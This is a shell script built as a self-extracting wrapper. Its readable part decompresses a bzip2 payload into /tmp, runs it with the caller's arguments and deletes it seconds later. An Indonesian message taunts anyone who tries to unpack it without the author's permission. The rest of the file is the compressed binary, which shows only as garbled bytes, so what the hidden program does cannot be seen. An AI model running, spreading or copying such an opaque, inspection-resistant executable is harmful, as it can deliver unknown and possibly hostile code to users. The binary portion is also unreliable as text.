#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYғ*� \��A�}���?��޿���@D@   `|/�}7b@�����↏S!�4z��<�@��@ ��M4����F@ & 48i��CCC#@2 ��h� ���DSAO)Oʟ�C�x6�5L�m#�mOP��4'���   h�  @     �B @S�	�=L�<�JzOSЛFCBh0�D�6��R�&X7��>/ۧ��}�����=�:1�.�������:X��z��&X�N4h޻%vW�iS֍h���ds�-	��$����G�ov�^�9����f����w�:��Q	
�5v<��N�[���vE1�J�b,Z�n�mFNe��8��"O�J�nR�R'�{�Y�p������s�剳!�7v���H�0JMQ|���������(L��X�.��g ��	X�#�9	�m��Qgg��	�0S����xrܟc���m�ݮ2;��ǔ����8J�����54�ϊ6�p�a)����l�fF�ܻsn*o�{���&
�(�b2�0;P7�@�:ҡQ�B�m�RA����O�:�!�@nFW	 �@°SZ,R�I4k D��l�2��ٿa'�u��N��u��'��륶���kL���[{w|�СC�K|Ud���"_w��4zIq��J�S<���0md� �9��C�R�x���T1v�U�w	�ӎ0� Z�!`EfL���t���|%�� �5$�![k��|�6��Wn��z�w��#����J�oF���U�3���S(^�"��>lk�,)f�ǹ�_MOa��t��~L�7���r�������I�?Fy����m�.�i�|�����y5P����Ĺ�ߣATꏯ��'6�����ͷ2]f�K�c[�~�&o����cc�Q�xk7Lr�z�L�>Ѷ9At�ꡟ�N�m0�V��������|u'	ҕ��4�~S�.dy|�|�bau�����,���ɥ/��Fh�/�Jy������'ݱ��N)�i`��6t�
�S���3'e����c]���iNRД�CH��~kŤ+.�\�V���t1н�[h@��L��;�iZ0��Λ&��[����B�C�LSV��gf�����$Y��N���  +��c_ �`K��J��9���Kf*`�%I��M�g�6j9�꼌Se��8��@�$���yT�����Y�C����W`�QPе��W4l�8!;�s�����Õ�����uMN"�U܉ ��&Ȍ��C�L1f��1�S~��mGr�i���rR&@TVD��i�e*�ܞ�3JԈH���B)�Q�\t|D�B��:%�Q;��Liv;+����Lz�Ϩ�"�O��+����]�F�)�)c�#. �5H0�0�b�48rl�>+�
q:��
�mc���f�VX��^��"�-ݯ/Az|3�!l���t6�Tq�ˆG�))�\�Od�[3$�q��Ț�d��-K:$���z��.��~�i9�N�է6�N2&&��M����/tz���*�I" ��^wt󂜖��U��݁���!� W�*�A�a����t����� ���"�(HiI�E 